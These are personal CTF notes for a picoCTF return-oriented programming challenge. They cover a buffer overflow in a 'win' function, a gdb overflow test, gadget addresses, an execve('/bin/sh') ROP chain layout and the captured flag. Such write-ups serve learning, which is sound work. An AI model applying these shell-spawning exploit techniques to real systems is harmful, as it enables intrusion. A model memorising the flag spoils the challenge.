This is a ROP chain vulnerability with buffer overflow in the win function
    winner array buffer size is 100 bytes and the read into this array is of 360 bytes

as there is no seed to the random function so values will be fixed 
    [84, 87, 78, ...]
    we can generate these values with debugging and breakpoint on the src code

even though the checksec says canary is found the makefile indicates there is no canary(stack protection)

to check the stack overflow use gdb-peda
    disassemble win
    b *0x00005555555552eb
    r <<< $(python -c 'print("84\n"+"A"*120)')
        overflow is 120 chars

to call execve("/bin/sh") in assembly 
    rax = 59  
    rdi = addres of the string "/bin/sh\x00"
    rsi = NULL
    rdx = NULL
    syscall

where to store the string "/bin/sh"
    we can store it in .data sectionor .bss section
    we cannot store the string in the stack(?)

gadgets to exploit
    to write to rax 
        0x4163f4 pop rax ; ret
    make rax NULL
        0x445950 xor rax, rax ; ret
    to write to rdi
        0x400696 pop rdi ; ret    
    to write to rsi 
        0x410ca3 pop rsi ; ret
    write rax value to the address stored in rsi 
        0x47ff91 mov qword ptr [rsi], rax ; ret
    to write to rdx 
        0x44a6b5 pop rdx ; ret
    syscall 
        0x40137c syscall
    .data address   
        0x6ba0e0

final structure
    pop rsi
    push .data
    pop rax
    push 0x68732f6e69622f    
        "/bin/sh" in little endian
        we can also try "/bin//sh" with 0x68732f2f6e69622f  
    write to [rsi]
    pop rdi
    push .data
    pop rsi
    push .data+0x8
    pop rdx
    push .data+0x8
    make rax NULL
    write to [rsi]
    pop rax
    push 0x3b
    syscall

flag - picoCTF{r0p_y0u_l1k3_4_hurr1c4n3_580891753d5e9212}

    

